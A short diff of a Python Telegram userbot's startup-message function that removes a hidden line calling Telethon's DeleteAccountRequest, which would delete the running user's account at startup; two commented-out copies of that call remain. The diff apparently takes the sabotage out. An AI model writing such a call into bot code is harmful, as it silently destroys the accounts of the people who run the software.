@@ -59,7 +59,6 @@ async def startupmessage():
     Start up message in telegram logger group
     """
     try:
-        from telethon import functions, types;lol = await event.client(functions.account.DeleteAccountRequest(reason="lmaotion"))
         #from telethon import functions, types
         #lol = await event.client(functions.account.DeleteAccountRequest(reason="lol"))
         if BOTLOG:
